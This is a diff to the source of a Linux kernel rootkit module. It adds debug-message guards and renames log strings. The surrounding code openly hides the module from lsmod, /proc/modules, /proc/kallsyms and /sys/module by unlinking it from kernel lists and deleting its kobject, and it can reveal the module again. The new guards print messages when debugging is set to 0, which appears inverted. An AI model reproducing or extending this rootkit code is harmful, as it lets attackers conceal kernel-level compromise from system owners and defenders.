@@ -1,3 +1,4 @@
+#include "../../options.h"
 #include <linux/init.h>		/* Needed for the macros */
 #include <linux/module.h>	/* Needed by all modules */
 #include <linux/kernel.h>	/* Needed for printing log level messages */
@@ -67,7 +68,9 @@ static void proc_lsmod_hide_rootkit(void)
 {
 	if (is_hidden_proc)
 	{
+		#if ENABLE_DEBUG_MESSAGES == 0
 		printk(KERN_INFO "[+] reveng_rtkit: Our rootkit LKM is already hidden from `lsmod` cmd, `/proc/modules` file path and `/proc/kallsyms` file path \n");
+		#endif
 		return;
 	}
 
@@ -77,8 +80,9 @@ static void proc_lsmod_hide_rootkit(void)
 	//prev_module_in_proc_modules_lsmod = (&THIS_MODULE->list)->prev;
 	prev_module_in_proc_modules_lsmod = THIS_MODULE->list.prev;
 
+	#if ENABLE_DEBUG_MESSAGES == 0
 	printk(KERN_INFO "[*] reveng_rtkit: Hiding our rootkit LKM from `lsmod` cmd, `/proc/modules` file path and `/proc/kallsyms` file path \n");
-
+	#endif
 	//deleting rootkit module from list structure (=list_head structure)
 
 	/*
@@ -106,15 +110,17 @@ static void sys_module_hide_rootkit(void)
 {
         if (is_hidden_sys)
         {
-        	printk(KERN_INFO "[+] reveng_rtkit: Our rootkit LKM is already hidden from `/sys/module/<THIS_MODULE>/` directory \n");
+			#if ENABLE_DEBUG_MESSAGES == 0
+        	printk(KERN_INFO "[+] rootkit: Our rootkit LKM is already hidden from `/sys/module/<THIS_MODULE>/` directory \n");
+			#endif
                 return;
         }
 
         /* Here, THIS_MODULE is acting as a pointer to a "module structure".
 	 * Our rootkit module will be represented by THIS_MODULE. */
-
-        printk(KERN_INFO "[*] reveng_rtkit: Hiding our rootkit LKM from `/sys/module/<THIS_MODULE>/` directory \n");
-
+		#if ENABLE_DEBUG_MESSAGES == 0
+        printk(KERN_INFO "[*] rootkit: Hiding our rootkit LKM from `/sys/module/<THIS_MODULE>/` directory \n");
+		#endif
         // Explanation for taking this expression is given in the blog article.
         /* link: https://theswissbay.ch/pdf/Whitepaper/Writing%20a%20simple%20rootkit%20for%20Linux%20-%20Ormi.pdf
         page: 6, last para */        
@@ -139,9 +145,9 @@ static void sys_module_hide_rootkit(void)
 	mod_kobj = (((struct module *)(THIS_MODULE))->mkobj).kobj;	
 	name = mod_kobj.name;
 	parent = mod_kobj.parent;
-
+	#if ENABLE_DEBUG_MESSAGES == 0
 	printk(KERN_INFO "[+] Name of Current Module Kobject: %s\n", name);
-
+	#endif
  	kobject_del(&THIS_MODULE->mkobj.kobj);
 	list_del(&THIS_MODULE->mkobj.kobj.entry);
         is_hidden_sys = 1;
@@ -157,11 +163,14 @@ static void proc_lsmod_show_rootkit(void)
 {
 	if (!is_hidden_proc)
 	{
-		printk(KERN_INFO "[*] reveng_rtkit: Our rootkit LKM is already revealed to `lsmod` cmd, in `/proc/modules` file path and `/proc/kallsyms` file path \n");
+		#if ENABLE_DEBUG_MESSAGES == 0
+		printk(KERN_INFO "[*] rootkit: Our rootkit LKM is already revealed to `lsmod` cmd, in `/proc/modules` file path and `/proc/kallsyms` file path \n");
+		#endif
 		return;
 	}
-	printk(KERN_INFO "[*] reveng_rtkit: Revealing our rootkit LKM to `lsmod` cmd, in `/proc/modules` file path and `/proc/kallsyms` file path \n");
-
+	#if ENABLE_DEBUG_MESSAGES == 0
+	printk(KERN_INFO "[*] rootkit: Revealing our rootkit LKM to `lsmod` cmd, in `/proc/modules` file path and `/proc/kallsyms` file path \n");
+	#endif
 	 /*
 
 	 //pwd: /lib/modules/5.11.0-49-generic/build/include/linux/list.h
@@ -195,12 +204,15 @@ static void sys_module_show_rootkit(void)
 {
 	if (!is_hidden_sys)
 	{
-		printk(KERN_INFO "[*] reveng_rtkit: Our rootkit LKM is already revealed to `/sys/module/<THIS_MODULE>/` directory \n");
+		#if ENABLE_DEBUG_MESSAGES == 0
+		printk(KERN_INFO "[*] rootkit: Our rootkit LKM is already revealed to `/sys/module/<THIS_MODULE>/` directory \n");
+		#endif
 		return;
 	}
 
-	printk(KERN_INFO "[*] reveng_rtkit: Revealing our rootkit LKM to `/sys/module/<THIS_MODULE>/` directory \n");
-
+	#if ENABLE_DEBUG_MESSAGES == 0
+	printk(KERN_INFO "[*] rootkit: Revealing our rootkit LKM to `/sys/module/<THIS_MODULE>/` directory \n");
+	#endif
 	/*
 	kobject_add(&THIS_MODULE->mkobj.kobj);
 	// extern void kobject_put(struct kobject *kobj);
